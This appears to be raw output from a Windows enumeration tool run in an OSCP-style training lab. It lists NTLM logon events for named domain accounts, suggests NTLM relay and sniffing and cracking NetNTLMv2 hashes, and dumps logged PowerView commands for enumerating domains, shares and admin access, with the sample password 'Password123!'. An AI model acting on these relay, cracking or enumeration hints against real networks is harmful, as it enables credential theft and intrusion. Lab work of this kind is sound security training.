  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:27:58 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:27:11 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:26:31 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:26:04 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:24:17 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:23:55 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:23:06 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:21:06 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:20:34 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:19:41 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:18:49 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:17:57 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:16:57 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:13:44 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:12:31 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:11:18 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:05:23 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:03:27 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:03:17 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:03:08 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:02:03 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:02:01 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:01:33 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:00:58 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:00:35 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:00:15 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:00:05 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:59:38 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:59:08 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:58:40 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:57:51 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:56:52 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:56:04 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:55:13 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:53:38 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:53:07 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:51:55 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:49:09 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:43:45 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       WS26$
  Subject Domain Name          :       OSCP
  Created (Utc)                :       2/22/2026 7:13:42 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       Negotiate
  Lm Package                   :       
  Logon Type                   :       RemoteInteractive
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       %%1843
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:13:40 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       WS26$
  Subject Domain Name          :       OSCP
  Created (Utc)                :       2/22/2026 7:13:30 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       Negotiate
  Lm Package                   :       
  Logon Type                   :       RemoteInteractive
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       %%1843
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 7:13:27 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       WS26$
  Subject Domain Name          :       OSCP
  Created (Utc)                :       2/22/2026 3:03:11 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       Negotiate
  Lm Package                   :       
  Logon Type                   :       RemoteInteractive
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       %%1843
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 3:03:05 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       WS26$
  Subject Domain Name          :       OSCP
  Created (Utc)                :       2/22/2026 3:02:00 AM
  IP Address                   :       -
  Authentication Package       :       MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
  Lm Package                   :       
  Logon Type                   :       Batch
  Target User Name             :       Administrator
  Target Domain Name           :       WS26
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       WS26$
  Subject Domain Name          :       OSCP
  Created (Utc)                :       2/22/2026 3:01:58 AM
  IP Address                   :       -
  Authentication Package       :       MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
  Lm Package                   :       
  Logon Type                   :       Batch
  Target User Name             :       Administrator
  Target Domain Name           :       WS26
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       WS26$
  Subject Domain Name          :       OSCP
  Created (Utc)                :       2/22/2026 3:01:58 AM
  IP Address                   :       -
  Authentication Package       :       MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
  Lm Package                   :       
  Logon Type                   :       Batch
  Target User Name             :       Administrator
  Target Domain Name           :       WS26
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       WS26$
  Subject Domain Name          :       OSCP
  Created (Utc)                :       2/22/2026 3:01:54 AM
  IP Address                   :       -
  Authentication Package       :       MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
  Lm Package                   :       
  Logon Type                   :       Batch
  Target User Name             :       Administrator
  Target Domain Name           :       WS26
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       WS26$
  Subject Domain Name          :       OSCP
  Created (Utc)                :       2/22/2026 3:01:53 AM
  IP Address                   :       -
  Authentication Package       :       MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
  Lm Package                   :       
  Logon Type                   :       Batch
  Target User Name             :       Administrator
  Target Domain Name           :       WS26
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       WS26$
  Subject Domain Name          :       OSCP
  Created (Utc)                :       2/22/2026 3:01:53 AM
  IP Address                   :       -
  Authentication Package       :       MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
  Lm Package                   :       
  Logon Type                   :       Batch
  Target User Name             :       Administrator
  Target Domain Name           :       WS26
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  NTLM relay might be possible - other users authenticate to this machine using NTLM!

  Accounts authenticate to this machine using NTLM v2!
  You can obtain NetNTLMv2 for these accounts by sniffing NTLM challenge/responses.
  You can then try and crack their passwords.

    OSCP\b.martin
    OSCP\g.jarvis
    OSCP\r.andrews
    WS26\Administrator

╔══════════╣ Process creation events - searching logs (EID 4688) for sensitive data.


╔══════════╣ PowerShell events - script block logs (EID 4104) - searching for sensitive data.

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Return all group members in the dev.testlab.local domain where the member is not in dev.testlab.local.
Get-DomainForeignGroupMember -Domain dev.testlab.local
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainForeignGroupMember -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential $Cred
Return all group members in the dev.testlab.local domain where the member is
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Return trusts for the "external.local" forest.
Get-ForestTrust -Forest "external.local"
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestTrust -Forest "external.local" -Credential $Cred
Return trusts for the "external.local" forest using the specified alternate credenitals.
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Return domain trusts for the "prod.testlab.local" domain using .NET methods
Get-DomainTrust -NET -Domain "prod.testlab.local"
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainTrust -Domain "prod.testlab.local" -Server "PRIMARY.testlab.local" -Credential $Cred
Return domain trusts for the "prod.testlab.local" domain enumerated through LDAP
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Enumerates the local group memberships for all reachable machines the dev.testlab.local domain.
Find-DomainLocalGroupMember -Domain dev.testlab.local
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainLocalGroupMember -Domain testlab.local -Credential $Cred
Enumerates the local group memberships for all reachable machines the dev.testlab.local
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Finds machines in the dev.testlab.local domain the current user has admin access to.
Find-LocalAdminAccess -Domain dev.testlab.local
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-LocalAdminAccess -Domain testlab.local -Credential $Cred
Finds machines in the testlab.local domain that the user with the specified -Credential
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Finds 'interesting' files on readable shares on the specified systems.
Find-InterestingDomainShareFile -ComputerName @('windows1.testlab.local','windows2.testlab.local')
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DEV\dfm.a', $SecPassword)
Find-DomainShare -Domain testlab.local -Credential $Cred
Searches interesting files in the testlab.local domain using the specified alternate credentials.
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
read access to.
Find all domain shares in the current domain that the current user has
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainShare -Domain testlab.local -Credential $Cred
Searches for domain shares in the testlab.local domain using the specified alternate credentials.
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Searchings for instances of putty.exe running on the current domain.
Find-DomainProcess -ProcessName putty.exe
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainProcess -Domain testlab.local -Credential $Cred
Searches processes being run by 'domain admins' in the testlab.local using the specified alternate credentials.
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
users in dev.testlab.local.
Enumerates Windows 7 computers in dev.testlab.local and returns user results for privileged
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainUserLocation -Domain testlab.local -Credential $Cred
Searches for domain admin locations in the testlab.local using the specified alternate credentials.
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
search term set in the title and were accessed within the last week.
Returns any files on the remote path \\WINDOWS7\Users\ that have the default
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-InterestingFile -Credential $Cred -Path "\\PRIMARY.testlab.local\C$\Temp\"
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Returns the saved network mounted drives for all machines in the domain.
Get-DomainComputer | Get-WMIRegMountedDrive
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegMountedDrive -ComputerName PRIMARY.testlab.local -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Returns the last user logged onto all machines in the domain.
Get-DomainComputer | Get-WMIRegLastLoggedOn
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegLastLoggedOn -ComputerName PRIMARY.testlab.local -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Returns what machines in the domain the current user has access to.
Get-DomainComputer | Test-AdminAccess
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Test-AdminAccess -ComputerName sqlserver -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Returns users actively logged on all domain controllers.
Get-DomainController | Get-RegLoggedOn
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-RegLoggedOn -ComputerName sqlserver -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Returns all logged on users for all computers in the domain.
Get-DomainComputer | Get-NetLoggedon
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetLoggedon -ComputerName sqlserver -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Returns all shares for all computers in the domain.
Get-DomainComputer | Get-NetShare
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetShare -ComputerName sqlserver -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Returns the policy for the dev.testlab.local domain controller.
Get-DomainPolicyData -Policy DC -Domain dev.testlab.local
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainPolicyData -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

